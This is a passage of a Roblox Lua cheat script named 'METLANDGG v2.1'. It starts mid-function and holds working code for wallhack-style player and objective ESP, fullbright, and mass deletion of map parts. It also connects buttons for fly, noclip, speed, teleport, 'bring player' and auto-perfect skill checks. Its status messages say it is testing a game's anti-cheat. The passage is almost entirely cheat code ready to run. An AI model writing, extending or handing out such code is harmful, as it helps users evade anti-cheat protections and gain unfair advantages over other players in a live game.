        skillCheckActive = false
        
        if autoPerfectConnection then
            autoPerfectConnection:Disconnect()
            autoPerfectConnection = nil
        end
        
        if minigameConnection then
            minigameConnection:Disconnect()
            minigameConnection = nil
        end
    end
end

-- ============================================
-- PLAYER ESP (WHITE)
-- ============================================
local espHighlights = {}
local espConnections = {}

local function addPlayerESP(player)
    if player == plr then return end
    
    local function createESP(character)
        task.wait(0.5)
        
        if espHighlights[player] then
            pcall(function() espHighlights[player]:Destroy() end)
        end
        
        local highlight = Instance.new("Highlight")
        highlight.Name = "ESP_" .. player.Name
        highlight.Adornee = character
        highlight.FillColor = Color3.fromRGB(255, 255, 255)
        highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
        highlight.FillTransparency = 0.5
        highlight.OutlineTransparency = 0
        highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
        highlight.Parent = character
        
        espHighlights[player] = highlight
        
        local hrp = character:FindFirstChild("HumanoidRootPart")
        if hrp then
            local billboard = Instance.new("BillboardGui")
            billboard.Name = "ESP_Distance_" .. player.Name
            billboard.Adornee = hrp
            billboard.Size = UDim2.new(0, 200, 0, 50)
            billboard.StudsOffset = Vector3.new(0, 3, 0)
            billboard.AlwaysOnTop = true
            billboard.Parent = hrp
            
            local nameLabel = Instance.new("TextLabel")
            nameLabel.Size = UDim2.new(1, 0, 0.5, 0)
            nameLabel.BackgroundTransparency = 1
            nameLabel.Text = player.Name
            nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
            nameLabel.TextSize = 16
            nameLabel.Font = Enum.Font.GothamBold
            nameLabel.TextStrokeTransparency = 0.5
            nameLabel.Parent = billboard
            
            local distLabel = Instance.new("TextLabel")
            distLabel.Size = UDim2.new(1, 0, 0.5, 0)
            distLabel.Position = UDim2.new(0, 0, 0.5, 0)
            distLabel.BackgroundTransparency = 1
            distLabel.Text = "0m"
            distLabel.TextColor3 = Color3.fromRGB(0, 255, 255)
            distLabel.TextSize = 14
            distLabel.Font = Enum.Font.Gotham
            distLabel.TextStrokeTransparency = 0.5
            distLabel.Parent = billboard
            
            task.spawn(function()
                while billboard.Parent and hrp.Parent and root and root.Parent do
                    local dist = (hrp.Position - root.Position).Magnitude
                    distLabel.Text = string.format("%.1fm", dist)
                    task.wait(0.5)
                end
            end)
        end
    end
    
    if player.Character then
        createESP(player.Character)
    end
    
    local conn = player.CharacterAdded:Connect(createESP)
    table.insert(espConnections, conn)
end

local function removePlayerESP()
    for player, highlight in pairs(espHighlights) do
        pcall(function() highlight:Destroy() end)
    end
    for _, conn in pairs(espConnections) do
        conn:Disconnect()
    end
    espHighlights = {}
    espConnections = {}
end

local function togglePlayerESP()
    settings.espEnabled = not settings.espEnabled
    
    if settings.espEnabled then
        espBtn.BackgroundColor3 = Color3.fromRGB(50, 220, 50)
        espBtn.Text = "Player ESP: ON ✓"
        updateStatus("Player ESP enabled", Color3.fromRGB(50, 220, 50))
        
        for _, p in pairs(Players:GetPlayers()) do
            addPlayerESP(p)
        end
        
        table.insert(espConnections, Players.PlayerAdded:Connect(addPlayerESP))
    else
        espBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
        espBtn.Text = "Player ESP: OFF"
        updateStatus("Player ESP disabled", Color3.fromRGB(200, 200, 200))
        removePlayerESP()
    end
end

-- ============================================
-- GENERATOR ESP (DEEP SCAN - NO LAG)
-- ============================================
local generatorHighlights = {}
local generatorConnection
local generatorCache = {}
local isScanning = false

local function findGenerators()
    if isScanning then return generatorCache end
    isScanning = true
    
    local generators = {}
    local count = 0
    
    task.spawn(function()
        for _, obj in pairs(workspace:GetDescendants()) do
            if obj:IsA("Model") or obj:IsA("BasePart") or obj:IsA("MeshPart") then
                local name = obj.Name:lower()
                
                if name:find("generator") or name:find("gen") or 
                   name:find("power") or name:find("electric") or
                   name:find("repair") or name:find("machine") or
                   name:find("objective") or name:find("interact") then
                    
                    if not name:find("generated") and 
                       not name:find("generic") and
                       not name:find("regenerat") then
                        
                        if not table.find(generators, obj) then
                            table.insert(generators, obj)
                            count = count + 1
                            
                            -- Yield every 5 iterations to prevent freezing
                            if count % 5 == 0 then
                                task.wait()
                            end
                        end
                    end
                end
            end
        end
        
        generatorCache = generators
        isScanning = false
    end)
    
    return generators
end

local function addGeneratorESP()
    if isScanning then 
        updateStatus("⏳ Still scanning...", Color3.fromRGB(255, 200, 0))
        return 
    end
    
    task.spawn(function()
        local generators = findGenerators()
        
        -- Wait for scan to complete
        while isScanning do
            task.wait(0.5)
        end
        
        updateStatus(string.format("Found %d generators", #generatorCache), Color3.fromRGB(255, 165, 0))
        
        if #generatorCache == 0 then
            updateStatus("⚠️ No generators found!", Color3.fromRGB(255, 100, 100))
            return
        end
        
        -- Add highlights with proper yielding
        for i, gen in pairs(generatorCache) do
            if not generatorHighlights[gen] then
                pcall(function()
                    local highlight = Instance.new("Highlight")
                    highlight.Name = "GeneratorESP"
                    highlight.Adornee = gen
                    highlight.FillColor = Color3.fromRGB(255, 165, 0)
                    highlight.OutlineColor = Color3.fromRGB(255, 215, 0)
                    highlight.FillTransparency = 1
                    highlight.OutlineTransparency = 0
                    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                    highlight.Parent = gen
                    
                    generatorHighlights[gen] = highlight
                end)
                
                -- Yield every 2 iterations to prevent lag
                if i % 2 == 0 then
                    task.wait()
                end
            end
        end
        
        updateStatus(string.format("✅ ESP on %d generators!", #generatorCache), Color3.fromRGB(50, 220, 50))
    end)
end

local function removeGeneratorESP()
    for gen, highlight in pairs(generatorHighlights) do
        pcall(function() highlight:Destroy() end)
    end
    
    if generatorConnection then
        generatorConnection:Disconnect()
        generatorConnection = nil
    end
    
    generatorHighlights = {}
    generatorCache = {}
    isScanning = false
end

local function toggleGeneratorESP()
    settings.generatorESPEnabled = not settings.generatorESPEnabled
    
    if settings.generatorESPEnabled then
        genEspBtn.BackgroundColor3 = Color3.fromRGB(50, 220, 50)
        genEspBtn.Text = "Generator ESP: ON ✓"
        updateStatus("🔍 Scanning generators...", Color3.fromRGB(255, 165, 0))
        
        addGeneratorESP()
        
        -- Rescan every 30 seconds instead of 20 to reduce lag
        generatorConnection = task.spawn(function()
            while settings.generatorESPEnabled do
                task.wait(30)
                if settings.generatorESPEnabled and not isScanning then
                    generatorCache = {}
                    addGeneratorESP()
                end
            end
        end)
    else
        genEspBtn.BackgroundColor3 = Color3.fromRGB(255, 165, 0)
        genEspBtn.Text = "Generator ESP: OFF"
        updateStatus("Generator ESP disabled", Color3.fromRGB(200, 200, 200))
        removeGeneratorESP()
    end
end

-- ============================================
-- FULLBRIGHT
-- ============================================
local oldLighting = {}
local function toggleFullbright()
    settings.fullbrightEnabled = not settings.fullbrightEnabled
    
    if settings.fullbrightEnabled then
        fbBtn.BackgroundColor3 = Color3.fromRGB(50, 220, 50)
        fbBtn.Text = "Fullbright: ON ✓"
        
        oldLighting.Brightness = Lighting.Brightness
        oldLighting.ClockTime = Lighting.ClockTime
        oldLighting.FogEnd = Lighting.FogEnd
        oldLighting.GlobalShadows = Lighting.GlobalShadows
        oldLighting.Ambient = Lighting.Ambient
        
        Lighting.Brightness = 3
        Lighting.ClockTime = 14
        Lighting.FogEnd = 100000
        Lighting.GlobalShadows = false
        Lighting.Ambient = Color3.new(1, 1, 1)
    else
        fbBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
        fbBtn.Text = "Fullbright: OFF"
        
        Lighting.Brightness = oldLighting.Brightness or 1
        Lighting.ClockTime = oldLighting.ClockTime or 12
        Lighting.FogEnd = oldLighting.FogEnd or 10000
        Lighting.GlobalShadows = oldLighting.GlobalShadows or true
        Lighting.Ambient = oldLighting.Ambient or Color3.new(0, 0, 0)
    end
end

-- ============================================
-- PART DESTROYER
-- ============================================
local function destroyPartsInRange()
    local range = tonumber(rangeBox.Text) or 10
    local destroyed = 0
    
    for _, part in pairs(workspace:GetDescendants()) do
        if part:IsA("BasePart") and part.Parent ~= char then
            local dist = (part.Position - root.Position).Magnitude
            if dist <= range then
                pcall(function()
                    part:Destroy()
                    destroyed = destroyed + 1
                end)
            end
        end
    end
    
    updateStatus("Destroyed " .. destroyed .. " parts", Color3.fromRGB(255, 150, 0))
end

local function destroyAllParts()
    local destroyed = 0
    
    for _, part in pairs(workspace:GetDescendants()) do
        if part:IsA("BasePart") and part.Parent ~= char then
            pcall(function()
                part:Destroy()
                destroyed = destroyed + 1
            end)
        end
    end
    
    updateStatus("⚠️ Destroyed " .. destroyed .. " parts!", Color3.fromRGB(255, 50, 50))
end

local function deleteModel()
    local modelName = deleteModelBox.Text
    if modelName == "" then
        updateStatus("Enter model name!", Color3.fromRGB(255, 100, 100))
        return
    end
    
    local found = false
    for _, obj in pairs(workspace:GetDescendants()) do
        if obj:IsA("Model") and obj.Name:lower():find(modelName:lower()) then
            pcall(function()
                obj:Destroy()
                updateStatus("Deleted: " .. obj.Name, Color3.fromRGB(255, 150, 0))
                found = true
            end)
        end
    end
    
    if not found then
        updateStatus("Model not found!", Color3.fromRGB(255, 100, 100))
    end
end

-- ============================================
-- CONNECT ALL BUTTONS
-- ============================================
minBtn.MouseButton1Click:Connect(toggleMinimize)
flyBtn.MouseButton1Click:Connect(toggleFly)
speedBtn.MouseButton1Click:Connect(setSpeed)
jumpBtn.MouseButton1Click:Connect(setJump)
infJumpBtn.MouseButton1Click:Connect(toggleInfJump)
noclipBtn.MouseButton1Click:Connect(toggleNoclip)
antiVoidBtn.MouseButton1Click:Connect(toggleAntiVoid)
platformBtn.MouseButton1Click:Connect(togglePlatform)
tpBtn.MouseButton1Click:Connect(tpToPlayer)
bringBtn.MouseButton1Click:Connect(bringPlayer)
tpToolBtn.MouseButton1Click:Connect(toggleTPTool)
autoCheckpointBtn.MouseButton1Click:Connect(toggleAutoCheckpoint)
autoPerfectBtn.MouseButton1Click:Connect(toggleAutoPerfect)
espBtn.MouseButton1Click:Connect(togglePlayerESP)
genEspBtn.MouseButton1Click:Connect(toggleGeneratorESP)
fbBtn.MouseButton1Click:Connect(toggleFullbright)
destroyBtn.MouseButton1Click:Connect(destroyPartsInRange)
destroyAllBtn.MouseButton1Click:Connect(destroyAllParts)
deleteModelBtn.MouseButton1Click:Connect(deleteModel)

-- ============================================
-- CLOSE BUTTON
-- ============================================
closeBtn.MouseButton1Click:Connect(function()
    settings.flyEnabled = false
    if flyConnection then flyConnection:Disconnect() end
    if flyBV then flyBV:Destroy() end
    if flyBG then flyBG:Destroy() end
    if noclipConnection then noclipConnection:Disconnect() end
    if antiVoidConnection then antiVoidConnection:Disconnect() end
    if platformConnection then platformConnection:Disconnect() end
    if platform then platform:Destroy() end
    if infJumpConnection then infJumpConnection:Disconnect() end
    if autoCheckpointConnection then autoCheckpointConnection:Disconnect() end
    if tpTool then tpTool:Destroy() end
    if autoPerfectConnection then autoPerfectConnection:Disconnect() end
    if minigameConnection then minigameConnection:Disconnect() end
    removePlayerESP()
    removeGeneratorESP()
    gui:Destroy()
end)

-- ============================================
-- CHARACTER RESPAWN HANDLER
-- ============================================
plr.CharacterAdded:Connect(function(newChar)
    task.wait(1)
    char = newChar
    hum = char:WaitForChild("Humanoid")
    root = char:WaitForChild("HumanoidRootPart")
    
    settings.flyEnabled = false
    settings.noclipEnabled = false
    settings.platformEnabled = false
    settings.autoCheckpointEnabled = false
    settings.tpToolEnabled = false
    
    if flyConnection then flyConnection:Disconnect() end
    if noclipConnection then noclipConnection:Disconnect() end
    if platformConnection then platformConnection:Disconnect() end
    if autoCheckpointConnection then autoCheckpointConnection:Disconnect() end
    if tpTool then tpTool:Destroy() tpTool = nil end
    
    toggleAntiVoid()
    
    updateStatus("Respawned! GUI preserved", Color3.fromRGB(100, 255, 100))
end)

-- ============================================
-- KEYBIND (Right Shift to Toggle)
-- ============================================
UIS.InputBegan:Connect(function(input, gpe)
    if gpe then return end
    if input.KeyCode == Enum.KeyCode.RightShift then
        toggleMinimize()
    end
end)

-- ============================================
-- NOTIFICATION
-- ============================================
pcall(function()
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "⚡ METLANDGG v2.1";
        Text = "Loaded! Testing METLANDGG... 🔒";
        Duration = 5;
    })
end)

updateStatus("Ready! Testing Violent District AC...", Color3.fromRGB(0, 255, 255))
print("✅ METLANDGG v2.1 LOADED - NO DUPLICATES")
print("🛡️ Testing METLANDGG")
print("📋 All features optimized and ready!")
